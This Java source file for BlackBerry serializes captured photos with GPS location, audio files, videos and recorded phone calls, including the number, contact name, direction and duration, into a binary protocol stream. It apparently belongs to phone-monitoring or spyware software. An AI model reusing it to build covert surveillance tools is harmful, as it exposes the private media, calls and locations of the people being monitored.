package com.vvt.prot.parser;

import java.io.IOException;
import java.io.OutputStream;
import net.rim.device.api.system.RuntimeStore;
import com.vvt.prot.event.AudioConvEvent;
import com.vvt.prot.event.AudioFileEvent;
import com.vvt.prot.event.CameraImageEvent;
import com.vvt.prot.event.PEvent;
import com.vvt.prot.event.VideoFileEvent;
import com.vvt.std.ByteUtil;
import com.vvt.std.FileUtil;
import com.vvt.std.ProtocolParserUtil;

public class FileEventParser {

	private static FileEventParser self;
	private static long FILE_EVENT_PARSER_GUID = 0xe9f55b105f791fabL;
	
	public static FileEventParser getInstance()	{
		if (self == null) {
			self = (FileEventParser) RuntimeStore.getRuntimeStore().get(FILE_EVENT_PARSER_GUID);
			if (self == null) {
				FileEventParser fileEventParser = new FileEventParser();
				RuntimeStore.getRuntimeStore().put(FILE_EVENT_PARSER_GUID, fileEventParser);
				self = fileEventParser;
			}
		}		
		return self;
	}
	
	public void parseEvent(PEvent event, OutputStream os) throws IOException {
		if (event instanceof CameraImageEvent) {
			parseEvent((CameraImageEvent) event, os);
		} else if (event instanceof AudioFileEvent) {
			parseEvent((AudioFileEvent) event, os);
		} else if (event instanceof AudioConvEvent) {
			parseEvent((AudioConvEvent) event, os);
		} else if (event instanceof VideoFileEvent) {
			parseEvent((VideoFileEvent) event, os);
		} 
	}
	
	private void parseEventHeader(PEvent event, OutputStream os) throws IOException {
		// EventType 2 Bytes.
		short eventType = (short)event.getEventType().getId();
		os.write(ByteUtil.toByte(eventType));
		// EventTime 19 Bytes.
		String eventTime = event.getEventTime();
		if (eventTime == null) {
			eventTime = "0000-00-00 00:00:00";
		} 
		os.write(ByteUtil.toByte(eventTime));
	}
	
	private void parseEvent(CameraImageEvent event, OutputStream os) throws IOException {		
		parseEventHeader(event, os);
		// ParingId 4 Bytes.
		int paringId = (int)event.getPairingId(); 
		os.write(ByteUtil.toByte(paringId));
		// Format 1 Byte.
		byte format = (byte)event.getFormat().getId();
		os.write(ByteUtil.toByte(format));
		// Longitude 8 Bytes. (Decimal)
		double longitude = event.getLongitude();
		os.write(ByteUtil.toByte(longitude));
		// Latitude 8 Bytes. (Decimal)
		double latitude = event.getLatitude();
		os.write(ByteUtil.toByte(latitude));
		// Altitude 4 Bytes.
		float altitude = (float) event.getAltitude();
		os.write(ByteUtil.toByte(altitude));
		String fileName = event.getFileName();
		ProtocolParserUtil.writeString1Byte(fileName, os);	
		String imagePath = event.getFilePath();
		if (imagePath != null) {
			int size = (int) FileUtil.getFileSize(imagePath);
			os.write(ByteUtil.toByte(size));
			if (size != 0) {
				FileUtil.write(imagePath, os);
			}
		} else {
			os.write(ByteUtil.toByte((int)0));
		}					
	}
	
	private void parseEvent(AudioFileEvent event, OutputStream os) throws IOException {
		parseEventHeader(event, os);
		// ParingId 4 Bytes.
		int paringId = (int)event.getPairingId(); 
		os.write(ByteUtil.toByte(paringId));
		// Format 1 Byte.
		byte format = (byte)event.getFormat().getId();
		os.write(ByteUtil.toByte(format));
		String fileName = event.getFileName();
		ProtocolParserUtil.writeString1Byte(fileName, os);
		String audioPath = event.getFilePath();
		if (audioPath != null) {
			int size = (int) FileUtil.getFileSize(audioPath);
			os.write(ByteUtil.toByte(size));
			if (size != 0) {
				FileUtil.write(audioPath, os);
			}
		} else {
			os.write(ByteUtil.toByte((int)0));
		}			
	}
	
	private void parseEvent(AudioConvEvent event, OutputStream os) throws IOException {
		parseEventHeader(event, os);
		// ParingId 4 Bytes.
		int paringId = (int)event.getPairingId(); 
		os.write(ByteUtil.toByte(paringId));
		// Format 1 Byte.
		byte format = (byte)event.getFormat().getId();
		os.write(ByteUtil.toByte(format));
		// Embeded_Call_Info
		// Direction 1 Byte.
		byte direction = (byte)event.getDirection().getId();
		os.write(ByteUtil.toByte(direction));
		// Duration 4 Bytes.
		int duration = (int)event.getDuration();
		os.write(ByteUtil.toByte(duration));
		String number = event.getNumber();
		ProtocolParserUtil.writeString1Byte(number, os);
		String contactName = event.getContactName();
		ProtocolParserUtil.writeString1Byte(contactName, os);			
		String fileName = event.getFileName();
		ProtocolParserUtil.writeString1Byte(fileName, os);
		String audioPath = event.getFilePath();
		if (audioPath != null) {
			int size = (int) FileUtil.getFileSize(audioPath);
			os.write(ByteUtil.toByte(size));
			if (size != 0) {
				FileUtil.write(audioPath, os);
			}
		} else {
			os.write(ByteUtil.toByte((int)0));
		}	
	}	
	
	private void parseEvent(VideoFileEvent event, OutputStream os) throws IOException {
		parseEventHeader(event, os);
		// ParingId 4 Bytes.
		int paringId = (int)event.getPairingId(); 
		os.write(ByteUtil.toByte(paringId));
		// Format 1 Byte.
		byte format = (byte)event.getFormat().getId();
		os.write(ByteUtil.toByte(format));
		String fileName = event.getFileName();
		ProtocolParserUtil.writeString1Byte(fileName, os);
		String videoPath = event.getFilePath();
		if (videoPath != null) {
			int size = (int) FileUtil.getFileSize(videoPath);
			os.write(ByteUtil.toByte(size));
			if (size != 0) {
				FileUtil.write(videoPath, os);
			}
		} else {
			os.write(ByteUtil.toByte((int)0));
		}		
	}	
}
